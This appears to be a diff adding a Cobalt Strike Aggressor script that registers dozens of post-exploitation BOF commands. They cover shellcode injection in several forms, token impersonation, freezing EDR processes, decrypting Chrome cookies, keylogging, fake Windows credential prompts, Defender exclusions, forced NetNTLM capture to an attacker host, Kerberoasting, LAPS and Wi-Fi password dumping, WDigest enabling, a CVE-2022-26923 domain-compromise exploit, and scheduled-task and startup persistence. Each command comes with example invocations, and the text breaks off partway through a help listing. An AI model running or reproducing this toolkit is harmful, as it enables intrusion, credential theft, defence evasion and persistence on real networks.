+    "MITRE ATT&CK: T1136.001 (Create Account: Local Account)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <username> <password> [admin]"
+);
+
+# --- make-token ---
+alias make-token {
+    local('$bid $domain $user $pass $args');
+    $bid    = $1;
+    $domain = $2;
+    $user   = $3;
+    $pass   = $4;
+    if ($domain is $null || $user is $null || $pass is $null) {
+        berror($bid, "Use: make-token <domain> <username> <password>\nExample: make-token CORP jdoe P@ssw0rd\nExample: make-token . localadmin P@ssw0rd");
+        return;
+    }
+    $args = bof_pack($bid, "zzz", $domain, $user, $pass);
+    dani_run($bid, "make-token", $args);
+}
+beacon_command_register(
+    "make-token",
+    "Create impersonation token — T1134.003 (by Dani)",
+    "Synopsis: make-token <domain> <username> <password>\n\n" .
+    "Description: Create a new logon token for the specified credentials\n" .
+    "using LogonUser (LOGON32_LOGON_NEW_CREDENTIALS) and apply it to\n" .
+    "the current thread for network authentication.\n\n" .
+    "Examples:\n" .
+    "  make-token CORP jdoe P@ssw0rd123\n" .
+    "  make-token . localadmin P@ssw0rd123\n\n" .
+    "MITRE ATT&CK: T1134.003 (Access Token Manipulation: Make and Impersonate Token)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <domain> <username> <password> (required)"
+);
+
+# --- shspawnas ---
+alias shspawnas {
+    local('$bid $domain $user $pass $cmd $args');
+    $bid    = $1;
+    $domain = $2;
+    $user   = $3;
+    $pass   = $4;
+    $cmd    = $5;
+    if ($domain is $null || $user is $null || $pass is $null || $cmd is $null) {
+        berror($bid, "Use: shspawnas <domain> <username> <password> <cmd>\nExample: shspawnas CORP jdoe P@ssw0rd cmd.exe");
+        return;
+    }
+    $args = bof_pack($bid, "zzzz", $domain, $user, $pass, $cmd);
+    dani_run($bid, "shspawnas", $args);
+}
+beacon_command_register(
+    "shspawnas",
+    "Spawn process as another user — T1134.002 (by Dani)",
+    "Synopsis: shspawnas <domain> <username> <password> <cmd>\n\n" .
+    "Description: Spawn a child process under alternate credentials using\n" .
+    "CreateProcessWithLogonW (shell execute equivalent). Useful for\n" .
+    "lateral movement to a compromised account.\n\n" .
+    "Examples:\n" .
+    "  shspawnas CORP jdoe P@ssw0rd cmd.exe\n\n" .
+    "MITRE ATT&CK: T1134.002 (Access Token Manipulation: Create Process with Token)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <domain> <username> <password> <cmd> (required)"
+);
+
+# --- suspendresume ---
+alias suspendresume {
+    local('$bid $pid $action $args');
+    $bid    = $1;
+    $pid    = $2;
+    $action = $3;
+    if ($pid is $null || $action is $null) {
+        berror($bid, "Use: suspendresume <pid> <suspend|resume>\nExample: suspendresume 4424 suspend\nExample: suspendresume 4424 resume");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $pid, $action);
+    dani_run($bid, "suspendresume", $args);
+}
+beacon_command_register(
+    "suspendresume",
+    "Suspend or resume a process — T1055 (by Dani)",
+    "Synopsis: suspendresume <pid> <suspend|resume>\n\n" .
+    "Description: Suspend or resume all threads in the target process\n" .
+    "using NtSuspendProcess/NtResumeProcess. Useful for freezing EDR\n" .
+    "processes momentarily during sensitive operations.\n\n" .
+    "Examples:\n" .
+    "  suspendresume 4424 suspend\n" .
+    "  suspendresume 4424 resume\n\n" .
+    "MITRE ATT&CK: T1055 (Process Injection)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <pid> <suspend|resume> (required)"
+);
+
+# --- global-unprotect ---
+alias global-unprotect {
+    local('$bid $ciphertext $args');
+    $bid       = $1;
+    $ciphertext = $2;
+    if ($ciphertext is $null) {
+        berror($bid, "Use: global-unprotect <ciphertext-hex>\nExample: global-unprotect 01000000D08C9DDF0115D...");
+        return;
+    }
+    $args = bof_pack($bid, "z", $ciphertext);
+    dani_run($bid, "global-unprotect", $args);
+}
+beacon_command_register(
+    "global-unprotect",
+    "DPAPI CryptUnprotectData (Chrome cookies) — T1555.003 (by Dani)",
+    "Synopsis: global-unprotect <ciphertext-hex>\n\n" .
+    "Description: Decrypt a DPAPI-protected blob using CryptUnprotectData\n" .
+    "with CRYPTPROTECT_LOCAL_MACHINE. Used to decrypt Chrome 'v10'+ cookies\n" .
+    "and browser-stored credentials. Pass the hex-encoded ciphertext.\n\n" .
+    "MITRE ATT&CK: T1555.003 (Credentials from Password Stores: Credentials from Web Browsers)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <ciphertext-hex> (required)"
+);
+
+# --- inject-crt ---
+alias inject-crt {
+    local('$bid $pid $sc $args');
+    $bid = $1;
+    $pid = $2;
+    $sc  = $3;
+    if ($pid is $null || $sc is $null) {
+        berror($bid, "Use: inject-crt <pid> <shellcode-hex>\nExample: inject-crt 4424 4831C04831D2EBFE");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $pid, $sc);
+    dani_run($bid, "inject-crt", $args);
+}
+beacon_command_register(
+    "inject-crt",
+    "CreateRemoteThread shellcode injection — T1055.002 (by Dani)",
+    "Synopsis: inject-crt <pid> <shellcode-hex>\n\n" .
+    "Description: Inject shellcode into a remote process using the classic\n" .
+    "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread technique.\n\n" .
+    "Examples:\n" .
+    "  inject-crt 4424 4831C04831D2EBFE\n\n" .
+    "MITRE ATT&CK: T1055.002 (Process Injection: Portable Executable Injection)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <pid> <shellcode-hex> (required)"
+);
+
+# --- inject-ntcreate ---
+alias inject-ntcreate {
+    local('$bid $pid $sc $args');
+    $bid = $1;
+    $pid = $2;
+    $sc  = $3;
+    if ($pid is $null || $sc is $null) {
+        berror($bid, "Use: inject-ntcreate <pid> <shellcode-hex>\nExample: inject-ntcreate 4424 4831C04831D2EBFE");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $pid, $sc);
+    dani_run($bid, "inject-ntcreate", $args);
+}
+beacon_command_register(
+    "inject-ntcreate",
+    "NtCreateThreadEx shellcode injection — T1055 (by Dani)",
+    "Synopsis: inject-ntcreate <pid> <shellcode-hex>\n\n" .
+    "Description: Inject shellcode into a remote process using\n" .
+    "NtCreateThreadEx — a lower-level alternative to CreateRemoteThread\n" .
+    "that bypasses some userland hooks.\n\n" .
+    "Examples:\n" .
+    "  inject-ntcreate 4424 4831C04831D2EBFE\n\n" .
+    "MITRE ATT&CK: T1055 (Process Injection)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <pid> <shellcode-hex> (required)"
+);
+
+# --- inject-apc ---
+alias inject-apc {
+    local('$bid $pid $sc $args');
+    $bid = $1;
+    $pid = $2;
+    $sc  = $3;
+    if ($pid is $null || $sc is $null) {
+        berror($bid, "Use: inject-apc <pid> <shellcode-hex>\nExample: inject-apc 4424 4831C04831D2EBFE");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $pid, $sc);
+    dani_run($bid, "inject-apc", $args);
+}
+beacon_command_register(
+    "inject-apc",
+    "APC queue shellcode injection — T1055.004 (by Dani)",
+    "Synopsis: inject-apc <pid> <shellcode-hex>\n\n" .
+    "Description: Inject shellcode via Asynchronous Procedure Call (APC)\n" .
+    "queued to all alertable threads in the target process. Executes\n" .
+    "when a thread enters an alertable wait state.\n\n" .
+    "Examples:\n" .
+    "  inject-apc 4424 4831C04831D2EBFE\n\n" .
+    "MITRE ATT&CK: T1055.004 (Process Injection: Asynchronous Procedure Call)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <pid> <shellcode-hex> (required)"
+);
+
+# --- inject-ktable ---
+alias inject-ktable {
+    local('$bid $pid $sc $args');
+    $bid = $1;
+    $pid = $2;
+    $sc  = $3;
+    if ($pid is $null || $sc is $null) {
+        berror($bid, "Use: inject-ktable <pid> <shellcode-hex>\nExample: inject-ktable 4424 4831C04831D2EBFE");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $pid, $sc);
+    dani_run($bid, "inject-ktable", $args);
+}
+beacon_command_register(
+    "inject-ktable",
+    "KernelCallbackTable hijack injection — T1055 (by Dani)",
+    "Synopsis: inject-ktable <pid> <shellcode-hex>\n\n" .
+    "Description: Inject shellcode by overwriting a function pointer in\n" .
+    "the target process's KernelCallbackTable (PEB+0x58), triggered by\n" .
+    "sending a WM_COPYDATA message. Avoids CreateRemoteThread.\n\n" .
+    "Examples:\n" .
+    "  inject-ktable 4424 4831C04831D2EBFE\n\n" .
+    "MITRE ATT&CK: T1055 (Process Injection)\n\n" .
+    "Phase: 3 — Remote Ops\nArgs: <pid> <shellcode-hex> (required)"
+);
+
+# ============================================================
+# ============================================================
+# PHASE 4 — OPERATORSKIT  (12 BOFs)
+# ============================================================
+# ============================================================
+
+# --- inject-poolparty ---
+alias inject-poolparty {
+    local('$bid $pid $sc $args');
+    $bid = $1;
+    $pid = $2;
+    $sc  = $3;
+    if ($pid is $null || $sc is $null) {
+        berror($bid, "Use: inject-poolparty <pid> <shellcode-hex>\nExample: inject-poolparty 4424 4831C04831D2EBFE");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $pid, $sc);
+    dani_run($bid, "inject-poolparty", $args);
+}
+beacon_command_register(
+    "inject-poolparty",
+    "Thread-pool (PoolParty) injection — T1055 (by Dani)",
+    "Synopsis: inject-poolparty <pid> <shellcode-hex>\n\n" .
+    "Description: Inject shellcode using the PoolParty technique — abuses\n" .
+    "Windows thread-pool worker factory objects to execute code in a\n" .
+    "target process without creating new threads or APCs.\n\n" .
+    "Examples:\n" .
+    "  inject-poolparty 4424 4831C04831D2EBFE\n\n" .
+    "MITRE ATT&CK: T1055 (Process Injection)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: <pid> <shellcode-hex> (required)"
+);
+
+# --- execute-crosssession ---
+alias execute-crosssession {
+    local('$bid $sessid $cmd $args');
+    $bid    = $1;
+    $sessid = $2;
+    $cmd    = $3;
+    if ($sessid is $null || $cmd is $null) {
+        berror($bid, "Use: execute-crosssession <sessionid> <cmd>\nExample: execute-crosssession 2 C:\\Windows\\System32\\calc.exe");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $sessid, $cmd);
+    dani_run($bid, "execute-crosssession", $args);
+}
+beacon_command_register(
+    "execute-crosssession",
+    "Cross-session execution via COM — T1021.003 (by Dani)",
+    "Synopsis: execute-crosssession <sessionid> <cmd>\n\n" .
+    "Description: Execute a command in another desktop session by abusing\n" .
+    "the IShellWindows/IShellBrowser COM interface to obtain a shell\n" .
+    "in the target session without token duplication.\n\n" .
+    "Examples:\n" .
+    "  execute-crosssession 2 C:\\Windows\\System32\\calc.exe\n\n" .
+    "MITRE ATT&CK: T1021.003 (Remote Services: Distributed Component Object Model)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: <sessionid> <cmd> (required)"
+);
+
+# --- dcom-localserver32 ---
+alias dcom-localserver32 {
+    local('$bid $host $clsid $args');
+    $bid   = $1;
+    $host  = $2;
+    $clsid = $3;
+    if ($host is $null || $clsid is $null) {
+        berror($bid, "Use: dcom-localserver32 <host> <clsid>\nExample: dcom-localserver32 TARGET01 {00021401-0000-0000-C000-000000000046}");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $host, $clsid);
+    dani_run($bid, "dcom-localserver32", $args);
+}
+beacon_command_register(
+    "dcom-localserver32",
+    "DCOM lateral movement via LocalServer32 — T1021.003 (by Dani)",
+    "Synopsis: dcom-localserver32 <host> <clsid>\n\n" .
+    "Description: Abuse a DCOM LocalServer32 COM object to execute commands\n" .
+    "on a remote host. Uses CoCreateInstanceEx for remote object instantiation.\n\n" .
+    "Examples:\n" .
+    "  dcom-localserver32 TARGET01 {00021401-0000-0000-C000-000000000046}\n\n" .
+    "MITRE ATT&CK: T1021.003 (Remote Services: Distributed Component Object Model)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: <host> <clsid> (required)"
+);
+
+# --- keylogger-rawinput ---
+alias keylogger-rawinput {
+    dani_run($1, "keylogger-rawinput", "");
+}
+beacon_command_register(
+    "keylogger-rawinput",
+    "Raw Input API keylogger — T1056.001 (by Dani)",
+    "Synopsis: keylogger-rawinput\n\n" .
+    "Description: Start a keylogger using the Windows Raw Input API\n" .
+    "(RegisterRawInputDevices) to capture keystrokes at the message loop level\n" .
+    "without hooking SetWindowsHookEx.\n\n" .
+    "MITRE ATT&CK: T1056.001 (Input Capture: Keylogging)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: none"
+);
+
+# --- enum-sec-products ---
+alias enum-sec-products {
+    dani_run($1, "enum-sec-products", "");
+}
+beacon_command_register(
+    "enum-sec-products",
+    "AV/EDR product detection — T1518.001 (by Dani)",
+    "Synopsis: enum-sec-products\n\n" .
+    "Description: Enumerate installed security products (AV, EDR, NGAV)\n" .
+    "by querying the SecurityCenter2 WMI namespace and checking known\n" .
+    "process names and service names.\n\n" .
+    "MITRE ATT&CK: T1518.001 (Software Discovery: Security Software Discovery)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: none"
+);
+
+# --- enum-sysmon ---
+alias enum-sysmon {
+    dani_run($1, "enum-sysmon", "");
+}
+beacon_command_register(
+    "enum-sysmon",
+    "Sysmon installation and config detection — T1518.001 (by Dani)",
+    "Synopsis: enum-sysmon\n\n" .
+    "Description: Detect Sysmon presence by checking the driver service,\n" .
+    "registry keys, and event log channels. Attempts to identify the\n" .
+    "loaded configuration hash.\n\n" .
+    "MITRE ATT&CK: T1518.001 (Software Discovery: Security Software Discovery)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: none"
+);
+
+# --- spn ---
+# Tier-1 stub: BOF currently reports all SPNs without filtering.
+# The <spn> arg listed in spec is not yet consumed.
+alias spn {
+    dani_run($1, "spn", "");
+}
+beacon_command_register(
+    "spn",
+    "SPN enumeration (Kerberoast prep) — T1558.003 (by Dani)",
+    "Synopsis: spn\n\n" .
+    "Description: Enumerate all Service Principal Names (SPNs) registered\n" .
+    "in the domain via LDAP — identifies Kerberoastable service accounts.\n\n" .
+    "NOTE: Tier-1 stub — lists all SPNs. Per-SPN filtering deferred to v2.\n\n" .
+    "MITRE ATT&CK: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: none (Tier-1 stub — args ignored)"
+);
+
+# --- wifi-passwords ---
+alias wifi-passwords {
+    dani_run($1, "wifi-passwords", "");
+}
+beacon_command_register(
+    "wifi-passwords",
+    "WLAN profile password dump — T1555 (by Dani)",
+    "Synopsis: wifi-passwords\n\n" .
+    "Description: Enumerate all saved WLAN profiles and extract their\n" .
+    "plaintext passphrases using WlanGetProfile with WLAN_PROFILE_GET_PLAINTEXT_KEY.\n\n" .
+    "MITRE ATT&CK: T1555 (Credentials from Password Stores)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: none"
+);
+
+# --- cred-prompt ---
+alias cred-prompt {
+    local('$bid $title $message $args');
+    $bid     = $1;
+    $title   = $2;
+    $message = $3;
+    if ($title is $null)   { $title   = "Windows Security"; }
+    if ($message is $null) { $message = "Enter your credentials"; }
+    $args = bof_pack($bid, "zz", $title, $message);
+    dani_run($bid, "cred-prompt", $args);
+}
+beacon_command_register(
+    "cred-prompt",
+    "Credential UI dialog prompt — T1056.002 (by Dani)",
+    "Synopsis: cred-prompt [title] [message]\n\n" .
+    "Description: Display a Windows credential prompt dialog\n" .
+    "(CredUIPromptForWindowsCredentials) and capture the entered username\n" .
+    "and password. Defaults to 'Windows Security' / 'Enter your credentials'.\n\n" .
+    "Examples:\n" .
+    "  cred-prompt\n" .
+    "  cred-prompt \"VPN Authentication\" \"Please enter your domain credentials\"\n\n" .
+    "MITRE ATT&CK: T1056.002 (Input Capture: GUI Input Capture)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: [title] [message] (both optional)"
+);
+
+# --- add-exclusion ---
+alias add-exclusion {
+    local('$bid $path $args');
+    $bid  = $1;
+    $path = $2;
+    if ($path is $null) {
+        berror($bid, "Use: add-exclusion <path>\nExample: add-exclusion C:\\Windows\\Temp\\payload.exe\nExample: add-exclusion C:\\Users\\Public\\");
+        return;
+    }
+    $args = bof_pack($bid, "z", $path);
+    dani_run($bid, "add-exclusion", $args);
+}
+beacon_command_register(
+    "add-exclusion",
+    "Add Windows Defender path exclusion — T1562.001 (by Dani)",
+    "Synopsis: add-exclusion <path>\n\n" .
+    "Description: Add a path or file exclusion to Windows Defender using\n" .
+    "the IWbemServices WMI interface (MSFT_MpPreference). Requires admin.\n\n" .
+    "Examples:\n" .
+    "  add-exclusion C:\\Windows\\Temp\\payload.exe\n" .
+    "  add-exclusion C:\\Users\\Public\\\n\n" .
+    "MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: <path> (required)"
+);
+
+# --- capture-netntlm ---
+alias capture-netntlm {
+    local('$bid $uncpath $args');
+    $bid     = $1;
+    $uncpath = $2;
+    if ($uncpath is $null) {
+        berror($bid, "Use: capture-netntlm <unc-path>\nExample: capture-netntlm \\\\\\\\ATTACKER\\\\share");
+        return;
+    }
+    $args = bof_pack($bid, "z", $uncpath);
+    dani_run($bid, "capture-netntlm", $args);
+}
+beacon_command_register(
+    "capture-netntlm",
+    "Force NetNTLMv2 hash capture via UNC — T1187 (by Dani)",
+    "Synopsis: capture-netntlm <unc-path>\n\n" .
+    "Description: Force the host to authenticate to a UNC path to capture\n" .
+    "the NetNTLMv2 hash (for relay or crack). Ensure Responder/ntlmrelayx\n" .
+    "is listening on the attacker host.\n\n" .
+    "Examples:\n" .
+    "  capture-netntlm \\\\\\\\192.168.1.100\\\\share\n\n" .
+    "MITRE ATT&CK: T1187 (Forced Authentication)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: <unc-path> (required)"
+);
+
+# --- authenticate-http ---
+alias authenticate-http {
+    local('$bid $url $args');
+    $bid = $1;
+    $url = $2;
+    if ($url is $null) {
+        berror($bid, "Use: authenticate-http <url>\nExample: authenticate-http http://192.168.1.100/auth");
+        return;
+    }
+    $args = bof_pack($bid, "z", $url);
+    dani_run($bid, "authenticate-http", $args);
+}
+beacon_command_register(
+    "authenticate-http",
+    "Force outbound NTLM HTTP authentication — T1187 (by Dani)",
+    "Synopsis: authenticate-http <url>\n\n" .
+    "Description: Force the host to perform NTLM authentication to an HTTP\n" .
+    "endpoint, capturing the NetNTLMv2 hash. Pair with Responder in\n" .
+    "HTTP/NTLM capture mode.\n\n" .
+    "Examples:\n" .
+    "  authenticate-http http://192.168.1.100/auth\n\n" .
+    "MITRE ATT&CK: T1187 (Forced Authentication)\n\n" .
+    "Phase: 4 — OperatorsKit\nArgs: <url> (required)"
+);
+
+# ============================================================
+# ============================================================
+# PHASE 4 — C2-COLLECTION  (8 BOFs)
+# ============================================================
+# ============================================================
+
+# --- psx ---
+alias psx {
+    dani_run($1, "psx", "");
+}
+beacon_command_register(
+    "psx",
+    "Process + token + security products (indirect syscalls) — T1057/T1134 (by Dani)",
+    "Synopsis: psx\n\n" .
+    "Description: Comprehensive process enumeration combining process list,\n" .
+    "token information, and security product identification. Uses indirect\n" .
+    "syscalls throughout to avoid userland hooks.\n\n" .
+    "MITRE ATT&CK: T1057 (Process Discovery), T1134 (Access Token Manipulation)\n\n" .
+    "Phase: 4 — C2-Collection\nArgs: none"
+);
+
+# --- psk ---
+alias psk {
+    dani_run($1, "psk", "");
+}
+beacon_command_register(
+    "psk",
+    "Kernel drivers + security product enumeration — T1518.001/T1057 (by Dani)",
+    "Synopsis: psk\n\n" .
+    "Description: Enumerate loaded kernel drivers alongside process information\n" .
+    "to identify security product drivers and EDR kernel components.\n\n" .
+    "MITRE ATT&CK: T1518.001 (Software Discovery: Security Software Discovery),\n" .
+    "              T1057 (Process Discovery)\n\n" .
+    "Phase: 4 — C2-Collection\nArgs: none"
+);
+
+# --- psm ---
+alias psm {
+    dani_run($1, "psm", "");
+}
+beacon_command_register(
+    "psm",
+    "Process modules via PEB walk — T1057/T1016 (by Dani)",
+    "Synopsis: psm\n\n" .
+    "Description: Enumerate all loaded modules (DLLs) in running processes\n" .
+    "by walking the Process Environment Block (PEB) loader data tables.\n" .
+    "Identifies injected DLLs and security product hooks.\n\n" .
+    "MITRE ATT&CK: T1057 (Process Discovery), T1016 (System Network Configuration Discovery)\n\n" .
+    "Phase: 4 — C2-Collection\nArgs: none"
+);
+
+# --- findobjects ---
+alias findobjects {
+    dani_run($1, "findobjects", "");
+}
+beacon_command_register(
+    "findobjects",
+    "Find safe injection target processes — T1057 (by Dani)",
+    "Synopsis: findobjects\n\n" .
+    "Description: Identify processes suitable for injection by filtering\n" .
+    "for same-architecture, same-session, unprotected processes that\n" .
+    "do not have security product DLLs loaded.\n\n" .
+    "MITRE ATT&CK: T1057 (Process Discovery)\n\n" .
+    "Phase: 4 — C2-Collection\nArgs: none"
+);
+
+# --- kerberoast ---
+# Tier-1 stub: <spn> arg listed in spec is not yet consumed by BOF.
+alias kerberoast {
+    dani_run($1, "kerberoast", "");
+}
+beacon_command_register(
+    "kerberoast",
+    "Request Kerberos service ticket for roasting — T1558.003 (by Dani)",
+    "Synopsis: kerberoast\n\n" .
+    "Description: Request Kerberos TGS tickets for enumerated SPNs and\n" .
+    "output them in hashcat-compatible format for offline cracking.\n\n" .
+    "NOTE: Tier-1 stub — per-SPN targeting deferred to v2. Currently\n" .
+    "roasts all discovered Kerberoastable accounts.\n\n" .
+    "MITRE ATT&CK: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)\n\n" .
+    "Phase: 4 — C2-Collection\nArgs: none (Tier-1 stub — <spn> arg ignored)"
+);
+
+# --- lapsdump ---
+alias lapsdump {
+    dani_run($1, "lapsdump", "");
+}
+beacon_command_register(
+    "lapsdump",
+    "LAPS password dump from AD — T1555 (by Dani)",
+    "Synopsis: lapsdump\n\n" .
+    "Description: Extract Local Administrator Password Solution (LAPS)\n" .
+    "passwords from Active Directory for all computer objects where the\n" .
+    "current user has read access to the ms-Mcs-AdmPwd attribute.\n\n" .
+    "MITRE ATT&CK: T1555 (Credentials from Password Stores)\n\n" .
+    "Phase: 4 — C2-Collection\nArgs: none"
+);
+
+# --- wdtoggle ---
+alias wdtoggle {
+    dani_run($1, "wdtoggle", "");
+}
+beacon_command_register(
+    "wdtoggle",
+    "Enable WDigest credential caching — T1003.001/T1112 (by Dani)",
+    "Synopsis: wdtoggle\n\n" .
+    "Description: Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\n" .
+    "\\WDigest\\UseLogonCredential to 1 to enable WDigest authentication,\n" .
+    "causing cleartext credentials to be cached in LSASS memory.\n" .
+    "Requires a new user logon to take effect.\n\n" .
+    "MITRE ATT&CK: T1003.001 (OS Credential Dumping: LSASS Memory),\n" .
+    "              T1112 (Modify Registry)\n\n" .
+    "Phase: 4 — C2-Collection\nArgs: none"
+);
+
+# --- cve-2022-26923 ---
+alias cve-2022-26923 {
+    local('$bid $machacct $pass $args');
+    $bid      = $1;
+    $machacct = $2;
+    $pass     = $3;
+    if ($machacct is $null || $pass is $null) {
+        berror($bid, "Use: cve-2022-26923 <machineacct> <password>\nExample: cve-2022-26923 EVIL-PC$ P@ssw0rd\nRequires: ADCS with Kerberos auth + machine account quota > 0");
+        return;
+    }
+    $args = bof_pack($bid, "zz", $machacct, $pass);
+    dani_run($bid, "cve-2022-26923", $args);
+}
+beacon_command_register(
+    "cve-2022-26923",
+    "AD CS dNSHostName spoofing — T1068 (by Dani)",
+    "Synopsis: cve-2022-26923 <machineacct> <password>\n\n" .
+    "Description: Exploit CVE-2022-26923 (Certifried) — set a machine account's\n" .
+    "dNSHostName to match a DC to obtain a DC certificate, enabling full domain\n" .
+    "compromise via pass-the-cert/PKINIT.\n\n" .
+    "Requires: ADCS with a template allowing machine enrolment,\n" .
+    "          MachineAccountQuota > 0 or existing machine account control.\n\n" .
+    "Examples:\n" .
+    "  cve-2022-26923 EVIL-PC$ P@ssw0rd\n\n" .
+    "MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)\n\n" .
+    "Phase: 4 — C2-Collection\nArgs: <machineacct> <password> (required)"
+);
+
+# ============================================================
+# ============================================================
+# PHASE 5 — PERSISTENCE  (2 BOFs, by Dani)
+# ============================================================
+# ============================================================
+
+# --- schtask-com ---
+alias schtask-com {
+    local('$bid $name $cmd $trigger $remove $args');
+    $bid     = $1;
+    $name    = $2;
+    $cmd     = $3;
+    $trigger = $4;
+    $remove  = $5;
+    if ($name is $null || $cmd is $null) {
+        berror($bid, "Use: schtask-com <name> <cmd> [trigger] [remove]\nExample: schtask-com updater C:\\Windows\\Temp\\payload.exe ONLOGON\nExample: schtask-com updater C:\\Windows\\Temp\\payload.exe ONLOGON remove");
+        return;
+    }
+    if ($trigger is $null) { $trigger = "ONLOGON"; }
+    if ($remove is $null)  { $remove  = ""; }
+    $args = bof_pack($bid, "zzzz", $name, $cmd, $trigger, $remove);
+    dani_run($bid, "schtask-com", $args);
+}
+beacon_command_register(
+    "schtask-com",
+    "Scheduled task persistence via COM — T1053.005 (by Dani)",
+    "Synopsis: schtask-com <name> <cmd> [trigger] [remove]\n\n" .
+    "Description: Create a persistent scheduled task using the Task Scheduler\n" .
+    "COM interface (ITaskService) — avoids schtasks.exe. Supports ONLOGON,\n" .
+    "ONSTART, and DAILY trigger types. Pass 'remove' to delete the task.\n\n" .
+    "Examples:\n" .
+    "  schtask-com updater C:\\Windows\\Temp\\payload.exe ONLOGON\n" .
+    "  schtask-com updater C:\\Windows\\Temp\\payload.exe DAILY\n" .
+    "  schtask-com updater C:\\Windows\\Temp\\payload.exe ONLOGON remove\n\n" .
+    "MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)\n\n" .
+    "Phase: 5 — Persistence\nArgs: <name> <cmd> [trigger] [remove]"
+);
+
+# --- lnk-startup ---
+alias lnk-startup {
+    local('$bid $name $target $lnkargs $remove $args');
+    $bid     = $1;
+    $name    = $2;
+    $target  = $3;
+    $lnkargs = $4;
+    $remove  = $5;
+    if ($name is $null || $target is $null) {
+        berror($bid, "Use: lnk-startup <name> <target> [args] [remove]\nExample: lnk-startup updater C:\\Windows\\Temp\\payload.exe\nExample: lnk-startup updater C:\\Windows\\Temp\\payload.exe \"\" remove");
+        return;
+    }
+    if ($lnkargs is $null) { $lnkargs = ""; }
+    if ($remove is $null)  { $remove  = ""; }
+    $args = bof_pack($bid, "zzzz", $name, $target, $lnkargs, $remove);
+    dani_run($bid, "lnk-startup", $args);
+}
+beacon_command_register(
+    "lnk-startup",
+    "Startup folder LNK persistence via COM — T1547.001 (by Dani)",
+    "Synopsis: lnk-startup <name> <target> [args] [remove]\n\n" .
+    "Description: Create a .lnk shortcut in the current user's Startup folder\n" .
+    "using the IShellLink COM interface (avoids writing scripts or schtasks).\n" .
+    "Pass 'remove' as the last argument to delete the shortcut.\n\n" .
+    "Examples:\n" .
+    "  lnk-startup updater C:\\Windows\\Temp\\payload.exe\n" .
+    "  lnk-startup updater C:\\Windows\\Temp\\payload.exe \"/silent\"\n" .
+    "  lnk-startup updater C:\\Windows\\Temp\\payload.exe \"\" remove\n\n" .
+    "MITRE ATT&CK: T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder)\n\n" .
+    "Phase: 5 — Persistence\nArgs: <name> <target> [args] [remove]"
+);
+
+# ============================================================
+# ============================================================
+# PHASE 6 — LOADER  (1 BOF)
+# ============================================================
+# ============================================================
+
+# --- bofx ---
+alias bofx {
+    local('$bid $bofpath $entry $bofargs $args');
+    $bid     = $1;
+    $bofpath = $2;
+    $entry   = $3;
+    $bofargs = $4;
+    if ($bofpath is $null) {
+        berror($bid, "Use: bofx <bof-path> [entry] [args]\nExample: bofx /tmp/mybof.x64.o go\nExample: bofx /tmp/mybof.x64.o go somearg");
+        return;
+    }
+    if ($entry is $null)   { $entry   = "go"; }
+    if ($bofargs is $null) { $bofargs = ""; }
+    local('$xargs $xpath');
+    $xargs = bof_pack($bid, "zzz", $bofpath, $entry, $bofargs);
+    $xpath = script_resource("../dist/bofx.x64.o");
+    if (!-exists $xpath) {
+        berror($bid, "[dani-suite] bofx.x64.o not found at: " . $xpath);
+        return;
+    }
+    bof_inline_execute($bid, $xpath, "go", $xargs);
+}
+beacon_command_register(
+    "bofx",
+    "OPSEC-hardened BOF loader (InlineExecuteEx fork) — Phase 6 (by Dani)",
+    "Synopsis: bofx <bof-path> [entry] [args]\n\n" .
+    "Description: Load and execute an arbitrary BOF using an OPSEC-hardened\n" .
+    "InlineExecuteEx fork. Supports ETW patching, sleep obfuscation, and\n" .
+    "cleanup of BOF artifacts from memory after execution.\n\n" .
+    "Examples:\n" .
+    "  bofx /tmp/custom.x64.o go\n" .
+    "  bofx /tmp/custom.x64.o go someargument\n\n" .
+    "Phase: 6 — Loader\nArgs: <bof-path> [entry=go] [args]"
+);
+
+# ============================================================
+# ============================================================
+# META-COMMAND: dani-help
+# ============================================================
+# ============================================================
+
+alias dani-help {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "=================================================================");
+    blog($bid, "  DEF-Situational-Awareness-BOF  //  by Dani");
+    blog($bid, "  68 BOFs across 6 phases  |  Use 'help <cmd>' for full syntax");
+    blog($bid, "=================================================================");
+    blog($bid, "");
+    blog($bid, "PHASE 1 — Canary (3 BOFs, no args)");
+    blog($bid, "  uptime         T1082     Uptime via KUSER_SHARED_DATA");
+    blog($bid, "  hostname       T1082     NetBIOS/DNS/FQDN via DFR");
+    blog($bid, "  whoami         T1033/34  Token info via indirect syscall");
+    blog($bid, "");
+    blog($bid, "PHASE 2 — Situational Awareness (25 BOFs)");
+    blog($bid, "  arp            T1018     ARP cache");
+    blog($bid, "  env            T1082     Env vars via PEB");
+    blog($bid, "  ipconfig       T1016     Adapter info");
